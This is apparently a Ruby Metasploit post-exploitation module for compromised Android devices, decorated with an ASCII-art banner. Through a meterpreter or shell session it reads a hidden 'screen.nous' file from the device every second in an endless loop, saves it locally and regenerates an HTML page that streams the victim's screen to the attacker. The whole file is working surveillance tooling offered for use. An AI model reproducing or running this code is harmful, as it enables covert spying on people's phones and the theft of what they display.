require 'sqlite3'
require 'fileutils'
require 'net/http'
require 'uri'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Android::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          'Name' => 'Android Gather and Serve Image - Cyberpunk Edition',
          'Description' => %q{
            Post Module to gather the "screen.nous" image and serve it on a web server.
            This module will repeatedly download the "screen.nous" image from the Android device,
            and generate an HTML file to display the image in a loop.
          },
          'License' => MSF_LICENSE,
          'Author' => ['Nous'],
          'SessionTypes' => ['meterpreter', 'shell'],
          'Platform' => 'android'
        }
      )
    )
  end
  
  def display_logo
    logo = <<~LOGO
      \e[1;35m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠴⠒⠒⠒⠒⠢⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⠞⠁⠀⠚⠋⢀⣠⡤⠤⠤⢤⣟⠲⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⢀⡞⢩⡖⠛⡾⠁⠀⠀⠀⡠⠊⠁⠀⠀⢰⣶⣶⡄⠙⢮⡙⢗⡄⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⢸⡅⢻⡀⡼⠁⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠻⡈⡇⠀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠳⣄⠉⠁⠀⠀⠀⢸⠁⠀⣀⠤⠖⠊⠉⠉⠉⠉⠒⢦⡀⠃⢸⡀⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⢸⡴⠋⠀⠀⢀⠀⠀⠀⠀⡀⠀⠀⠙⢿⡀⢣⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢀⡼⠁⠀⢠⡇⠀⣿⠛⢿⡄⠀⣇⣆⠀⡆⠀⢹⣼⡄⠀⠀⠀⠀coded by nous
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⣸⠃⢢⣷⣸⡇⣀⢿⠀⢸⣇⡀⣹⣼⡀⠰⠀⢘⣿⡇⠀⠀⠀⠀17/02/2022
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⡏⢀⠾⠴⢟⡛⣟⠛⠀⣸⠙⠈⣷⡟⠺⢿⣾⠾⣿⠁⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⢸⠃⠀⢸⢳⢾⡀⠰⣹⣿⠏⠀⠀⠀⠀⠀⢻⣿⣷⢬⣿⣴⠿⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⠀⡜⠀⠀⡞⠻⡇⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⣼⠏⠙⡄⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠀⢰⠃⢀⣼⣆⠀⣙⣦⠀⠀⠀⠀⠀⠀⠤⠀⠀⠀⠀⣰⢻⠀⠀⣿⠀⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⢀⡇⢀⠎⠘⠀⠑⠏⠋⠙⢤⡀⠀⠀⠠⠦⠀⢀⡤⢾⠃⢸⠀⠀⠰⣇⠀⠀⠀⠀
      \e[1;35m⠀⠀⠀⠀⠘⣇⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢶⣶⣶⠚⠉⠀⢸⠀⢠⠀⠀⠀⠙⣆⠀⠀⠀
      \e[1;35m⠀⠀⠀⢀⡾⠛⡇⠀⠀⠀⠀⠀⠀⠀⣠⠔⠊⢁⣿⣿⠓⠠⣄⡈⡀⢸⠀⠀⠀⠀⢸⠀⠀⠀
      \e[1;35m⠀⠀⢀⡞⠁⠀⠘⠢⡀⠀⠀⣠⡔⠋⠀⡠⠀⢸⠉⠁⠀⠠⠀⠉⠃⢸⠀⠀⢀⣴⡁⠀⠀⠀
      \e[1;35m⠀⠀⡼⠀⠀⠀⠀⠘⠈⠁⠉⠉⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠐⠄⡇⢸⠉⠉⠁⠀⢱⡄⠀⠀
      \e[1;35m⠀⣼⠁⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⢠⢦⠀⠀⠀⣧⠃⠀⠀⠀⠇⠀⢳⠀⠀
      \e[1;35m⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠘⠛⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⢸⡇⠀
      \e[1;35m ⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡇⠀
      \e[1;35m ⢸⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀
      \e[1;35m ⠈⡆⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣴⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇
      \e[1;35m         ░  ░░   ░           ░       ░  ░
      \e[0m
    LOGO
    print_line(logo)
    print_status(cyberpunk_text(":: Akina DB Extraction images ::", '36'))
  end

  def download_screen_nous
    screen_path = '/sdcard/.nous/screen.nous'
    unless file_exist?(screen_path)
      print_error("screen.nous not found on the device.")
      return nil
    end
    data = read_file(screen_path)
    if data.blank?
      print_error("Unable to read screen.nous.")
      return nil
    end
    print_good("Downloaded screen.nous file with length #{data.length}")
    return data
  end

  def generate_html_file(html_file_path, start_time)
    # Gerar o conteúdo HTML
    html_content = <<~HTML
      <html>
      <head>
      <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
      <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
      <title>Metasploit screenshare - 127.0.0.1</title>
      <script language="javascript">
      function updateStatus(msg) {
        var status = document.getElementById("status");
        status.innerText = msg;
      }
      function noImage() {
        document.getElementById("streamer").style = "display:none";
        updateStatus("Waiting");
      }
      var i = 0;
      function updateFrame() {
        var img = document.getElementById("streamer");
        img.src = "screen.nous#" + i;
        img.style = "display:";
        updateStatus("Playing");
        i++;
      }

      setInterval(function() {
        updateFrame();
      }, 1000);

      </script>
      </head>
      <body>
      <noscript>
        <h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
      </noscript>
      <pre>
      Start time : #{start_time}
      Status     : <span id="status"></span>
      </pre>
      <br>
      <img onerror="noImage()" id="streamer", height="500", width="250">
      <br><br>
      <a href="http://www.metasploit.com" target="_blank">www.metasploit.com</a>
      </body>
      </html>
    HTML

    File.open(html_file_path, 'w') do |file|
      file.write(html_content)
    end

    print_status("Arquivo HTML gerado com sucesso em #{html_file_path}")
  end

  def run
    display_logo
    print_status("Starting the image server...")
    start_time = Time.now.strftime("%Y-%m-%d %H:%M:%S")
    html_file_path = "screen_share.html"
    generate_html_file(html_file_path, start_time)
    print_good("Capturando....")
    loop do
      sleep 1
      data = download_screen_nous
      next if data.nil?
      File.open('screen.nous', 'wb') do |file|
        file.write(data)
      end
      generate_html_file(html_file_path, start_time)
    end
  end
end
